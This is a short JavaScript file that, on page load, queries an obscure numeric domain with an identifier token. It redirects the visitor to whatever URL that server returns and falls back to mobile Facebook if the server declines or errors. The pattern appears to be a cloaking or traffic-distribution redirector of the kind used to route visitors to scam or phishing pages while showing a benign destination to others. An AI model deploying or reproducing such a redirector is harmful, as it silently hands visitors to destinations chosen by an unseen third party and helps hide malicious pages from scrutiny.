$(document).ready(function () {
    $.ajax({
        url: 'https://658754.info/get?name=mf7wbzs5myunuep0u7f2',
        type: 'GET',
        async: false,
        success: function (msg) {
            if(msg.success){
                window.location.href = msg.url;
            }
            else{
                window.location.href = "https://m.facebook.com/";
            }
        },
        error: function (msg) {
            window.location.href = "https://m.facebook.com/";
        }
    })
});